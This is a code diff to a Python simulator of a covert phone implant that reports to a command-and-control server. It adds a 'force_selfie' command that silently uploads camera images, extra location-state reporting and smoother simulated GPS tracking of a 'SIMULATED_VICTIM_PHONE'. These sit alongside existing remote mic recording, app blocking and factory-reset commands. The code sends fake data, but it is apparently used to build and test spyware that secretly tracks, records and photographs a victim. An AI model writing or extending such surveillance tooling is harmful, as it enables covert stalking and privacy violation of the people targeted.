@@ -5,6 +5,7 @@ import uuid
 import wave
 import io
 import time
+import math
 import random
 import urllib.request
 import urllib.parse
@@ -30,9 +31,11 @@ if choice == '2':
     ip_add = ip_add.replace("http://", "").replace("https://", "").split("/")[0]
     base_url = f"wss://{ip_add}/ws"
     upload_url = f"https://{ip_add}/upload_audio"
+    upload_selfie_url = f"https://{ip_add}/api/upload-selfie"
 else:
     base_url = "ws://127.0.0.1:8000/ws"
     upload_url = "http://127.0.0.1:8000/upload_audio"
+    upload_selfie_url = "http://127.0.0.1:8000/api/upload-selfie"
 
 IMPLANT_KEY = "DeltaForce2027"
 DEVICE_ID = "SIMULATED_VICTIM_PHONE"
@@ -40,6 +43,8 @@ DEVICE_ID = "SIMULATED_VICTIM_PHONE"
 installed_apps = "com.android.settings,com.whatsapp,com.facebook.katana,com.instagram.android"
 location_tracking = True
 lat, lon = 56.9496, 24.1052
+heading = random.uniform(0, 360)
+speed_ms = random.uniform(0.5, 2.0)
 battery = 100
 charging = 1
 screen_time_minutes = 0
@@ -94,11 +99,34 @@ async def upload_audio_sim():
         
         req_up = urllib.request.Request(upload_url, data=b''.join(body))
         req_up.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
-        with suppress(Exception):
-            urllib.request.urlopen(req_up, timeout=10)
-        safe_print(f"    [✔] UPLOAD COMPLETE!")
+        try:
+            await asyncio.to_thread(urllib.request.urlopen, req_up, timeout=10)
+            safe_print(f"    [✔] UPLOAD COMPLETE!")
+        except Exception as e:
+            safe_print(f"    [x] UPLOAD FAILED: {e}")
     except Exception as e:
         safe_print(f"    [x] UPLOAD FAILED: {e}")
+
+async def upload_selfie_sim():
+    safe_print(f"    [⬆️] UPLOADING SELFIE to {upload_selfie_url}...")
+    try:
+        boundary = uuid.uuid4().hex
+        body = []
+        body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="implant_key"\r\n\r\n{IMPLANT_KEY}\r\n'.encode('utf-8'))
+        body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="device_id"\r\n\r\n{DEVICE_ID}\r\n'.encode('utf-8'))
+        jpeg_data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00@\x00@\x00\x00\xff\xdb\x00C\x00' + b'\x08'*64 + b'\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x03\x01\"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00?\x00\xd2\xcf \xff\xd9'
+        body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="selfie"; filename="selfie.jpg"\r\nContent-Type: image/jpeg\r\n\r\n'.encode('utf-8') + jpeg_data + b'\r\n')
+        body.append(f'--{boundary}--\r\n'.encode('utf-8'))
+
+        req_up = urllib.request.Request(upload_selfie_url, data=b''.join(body))
+        req_up.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+        try:
+            await asyncio.to_thread(urllib.request.urlopen, req_up, timeout=10)
+            safe_print(f"    [✔] SELFIE UPLOAD COMPLETE!")
+        except Exception as e:
+            safe_print(f"    [x] SELFIE UPLOAD FAILED: {e}")
+    except Exception as e:
+        safe_print(f"    [x] SELFIE UPLOAD FAILED: {e}")
 
 async def manual_screen_time_sender(ws):
     global screen_time_minutes, charging, battery, typing, current_prompt
@@ -137,6 +165,7 @@ async def manual_screen_time_sender(ws):
                 "device_id": DEVICE_ID,
                 "battery": battery,
                 "charging": charging,
+                "loc_state": 1 if location_tracking else 0,
                 "lat": lat if location_tracking else 0.0,
                 "lon": lon if location_tracking else 0.0,
                 "installed_apps": installed_apps
@@ -157,6 +186,7 @@ async def manual_screen_time_sender(ws):
                 "device_id": DEVICE_ID,
                 "battery": battery,
                 "charging": charging,
+                "loc_state": 1 if location_tracking else 0,
                 "lat": lat if location_tracking else 0.0,
                 "lon": lon if location_tracking else 0.0,
                 "installed_apps": installed_apps
@@ -187,6 +217,7 @@ async def manual_screen_time_sender(ws):
                 "device_id": DEVICE_ID,
                 "battery": battery,
                 "charging": charging,
+                "loc_state": 1 if location_tracking else 0,
                 "lat": lat if location_tracking else 0.0,
                 "lon": lon if location_tracking else 0.0,
                 "installed_apps": installed_apps,
@@ -227,7 +258,7 @@ async def manual_screen_time_sender(ws):
         safe_print("    [!] Unknown command. Use 'screen HH MM', 'charge on|off', 'error <src> <msg>', or 'toggle charge'.")
 
 async def run_simulator():
-    global lat, lon, battery, charging, location_tracking, screen_time_minutes, last_hour_reported, last_sent_installed_apps, last_sent_battery, last_sent_charging, last_sent_screen_time
+    global lat, lon, battery, charging, location_tracking, screen_time_minutes, last_hour_reported, last_sent_installed_apps, last_sent_battery, last_sent_charging, last_sent_screen_time, heading, speed_ms
     while True:
         try:
             async with websockets.connect(base_url) as ws:
@@ -250,6 +281,16 @@ async def run_simulator():
                             task = cmd.get("task")
                             if task == "check_location_state":
                                 safe_print("    [!] CHECK LOCATION STATE REQUEST RECEIVED")
+                                await ws.send(json.dumps({
+                                    "implant_key": IMPLANT_KEY,
+                                    "device_id": DEVICE_ID,
+                                    "loc_state": 1 if location_tracking else 0,
+                                    "battery": battery,
+                                    "charging": charging,
+                                    "lat": lat if location_tracking else 0.0,
+                                    "lon": lon if location_tracking else 0.0
+                                }))
+                                safe_print(f"    [>] LOCATION STATE SENT: {'ON' if location_tracking else 'OFF'}")
                             elif task == "update_blocked_apps":
                                 safe_print(f"    [!] UPDATING BLOCKED APPS LIST: {cmd.get('apps')}")
                             elif task == "refresh_installed_apps":
@@ -277,6 +318,9 @@ async def run_simulator():
                             elif task == "mic_record":
                                 safe_print("    [🎤] MIC RECORD REQUEST RECEIVED")
                                 asyncio.create_task(upload_audio_sim())
+                            elif task == "force_selfie":
+                                safe_print("    [📸] FORCE SELFIE REQUEST RECEIVED")
+                                asyncio.create_task(upload_selfie_sim())
                             elif task == "power_cmd":
                                 safe_print(f"    [!] POWER COMMAND RECEIVED: action={cmd.get('action')}")
                             elif task == "factory_reset":
@@ -295,8 +339,19 @@ async def run_simulator():
                     # Sender loop
                     while True:
                         if location_tracking:
-                            lat += random.uniform(-0.0002, 0.0005)
-                            lon += random.uniform(0.0001, 0.0008)
+                            # Simulate a low-speed heading-based movement so updates are smooth
+                            speed_ms += random.uniform(-0.25, 0.25)
+                            speed_ms = max(0.2, min(speed_ms, 6.0))
+                            heading += random.uniform(-10, 10)
+                            heading %= 360
+
+                            distance = speed_ms * ping_interval
+                            lat += (distance * math.cos(math.radians(heading))) / 111320
+                            lon += (distance * math.sin(math.radians(heading))) / (111320 * math.cos(math.radians(lat)))
+
+                            # Add a tiny GPS jitter on top of movement
+                            lat += random.uniform(-0.00001, 0.00001)
+                            lon += random.uniform(-0.00001, 0.00001)
 
                         if charging == 1:
                             if battery < 100 and random.random() < 0.8:
@@ -310,6 +365,7 @@ async def run_simulator():
                         payload = {
                             "implant_key": IMPLANT_KEY,
                             "device_id": DEVICE_ID,
+                            "loc_state": 1 if location_tracking else 0,
                             "lat": lat if location_tracking else 0.0,
                             "lon": lon if location_tracking else 0.0
                         }
